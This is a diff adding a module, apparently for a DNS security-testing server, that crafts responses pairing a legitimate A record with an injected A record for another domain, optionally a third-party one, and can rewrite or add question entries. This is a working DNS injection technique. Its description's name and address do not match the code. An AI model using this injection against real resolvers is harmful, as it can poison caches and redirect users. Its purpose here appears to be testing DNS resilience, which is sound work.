@@ -1,0 +1,46 @@
+[module]
+name = "inj03"
+info = "Injection 3 - A record with injected A record in the end"
+desc = "Respond with legit A record (1.2.3.4) + injected A record (inj3poc.yourdomain.com -> 6.6.6.6)."
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("inj03"):
+   # Send 1 legit A record + 1 injected A record
+   ip = "1.2.3.4"
+   injip = "6.6.6.3"
+   addedquestions = b''
+   if "3rdparty" in req.subdomains:  # inject a 3rd party domain
+      injdom = "injected03." + a3rdparty_domain
+   else:
+      injdom = "injected03." + req.sld_tld_domain
+   if "replq" in req.subdomains:  # replace the question with our injected stuffs
+      orig_req_domain = req.full_domain
+      req.full_domain = injdom
+      addcustomlog("REPLQ")
+   if "addq" in req.subdomains:  # add additional question for our injected stuffs
+      resp.QURR = req.QURR+1
+      addedquestions  = convDom2Bin(injdom) + req.type_bin + req.class_bin
+      addcustomlog("ADDQ")
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x84\x00', resp.QURR, 2, 0, 0)
+   ### QUESTION SECTION ########
+   if resp.noq: buffer += convDom2Bin(req.full_domain) + req.type_bin + req.class_bin
+   buffer += addedquestions
+   ### ANSWER SECTION ########
+   # A
+   buffer += convDom2Bin(req.full_domain) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", 4)                        ## Data length
+   buffer += socket.inet_aton(ip)                        ## IP
+   # injected A
+   buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)                 ## TTL
+   buffer += struct.pack(">H", 4)                        ## Data length
+   buffer += socket.inet_aton(injip)                     ## IP
+   # log and send
+   log("A %s + A %s (%s)" % (ip, injdom, injip))
+   send_buf(self, buffer)
+   #####################################################################
+'''
